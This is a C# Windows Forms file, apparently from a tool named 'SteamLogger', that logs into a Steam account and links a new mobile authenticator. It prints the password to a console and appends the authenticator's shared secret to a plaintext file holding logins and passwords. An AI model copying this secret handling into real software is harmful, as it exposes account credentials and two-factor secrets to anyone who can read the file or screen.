using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using SteamAuth;

namespace SteamLogger
{
    public partial class CreateSteamAuthLink : Form
    {
        public string pass;
        public string login1;
        public CreateSteamAuthLink(string a1, string a2)
        {
            InitializeComponent();
            this.login1 = a1;
            this.pass = a2;
        }
        private void CreateSteamAuthLink_Load(object sender, EventArgs e)
        {

        }


        private void ENAddition_Click(object sender, EventArgs e)
        {
            MessageBox.Show("A new mobile autifier is being created on your computer\n(You can no longer create a new one)", "SteamAuth");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("The computer copies the data from the Steam application from your phone \nrecompiles it and installs it back\n(SteamGuard remains on two devices)", "SteamAuth");
        }

        private void v1_Click(object sender, EventArgs e)
        {
            Task.Factory.StartNew(Console);
        }

        private void v2_Click(object sender, EventArgs e)
        {
            
        }

        private void Console() 
        {
            if (AllocConsole())
            {
                while (true)
                {
                    System.Console.WriteLine("login with param: " + login1 + ", " + pass);
                    string username = login1;
                    string password = pass;
                    string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\SteamAuth\users.txt";
                    string[] lines = File.ReadAllLines(path);
                    int index = Array.IndexOf(lines, username + "/ /,/ /" + password + "/ /,/ /");
                    UserLogin login = new UserLogin(username, password);
                    LoginResult response = LoginResult.BadCredentials;
                    while ((response = login.DoLogin()) != LoginResult.LoginOkay)
                    {
                        switch (response)
                        {
                            case LoginResult.NeedEmail:
                                System.Console.WriteLine("Please enter your email code: ");
                                string code = System.Console.ReadLine();
                                login.EmailCode = code;
                                break;

                            case LoginResult.NeedCaptcha:
                                System.Diagnostics.Process.Start(APIEndpoints.COMMUNITY_BASE + "/public/captcha.php?gid=" + login.CaptchaGID); //Open a web browser to the captcha image
                                System.Console.WriteLine("Please enter captcha text: ");
                                string captchaText = System.Console.ReadLine();
                                login.CaptchaText = captchaText;
                                break;

                            case LoginResult.Need2FA:
                                System.Console.WriteLine("Please enter your mobile authenticator code: ");
                                code = System.Console.ReadLine();
                                login.TwoFactorCode = code;
                                break;
                        }
                    }

                    AuthenticatorLinker linker = new AuthenticatorLinker(login.Session);
                    linker.PhoneNumber = null; //Set this to non-null to add a new phone number to the account.
                    var result = linker.AddAuthenticator();

                    if (result != AuthenticatorLinker.LinkResult.AwaitingFinalization)
                    {
                        System.Console.WriteLine("Failed to add authenticator: " + result);
                        continue;
                    }

                    try
                    {
                        lines[index] += linker.LinkedAccount.SharedSecret;
                        File.WriteAllLines(path, lines);
                    }
                    catch (Exception e)
                    {
                        System.Console.WriteLine(e);
                        System.Console.WriteLine("EXCEPTION saving maFile. For security, authenticator will not be finalized.");
                        continue;
                    }

                    System.Console.WriteLine("Please enter SMS code: ");
                    string smsCode = System.Console.ReadLine();
                    var linkResult = linker.FinalizeAddAuthenticator(smsCode);

                    if (linkResult != AuthenticatorLinker.FinalizeResult.Success)
                    {
                        System.Console.WriteLine("Unable to finalize authenticator: " + linkResult);
                    }
                }
            }
        }
        
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool FreeConsole();
    }
}
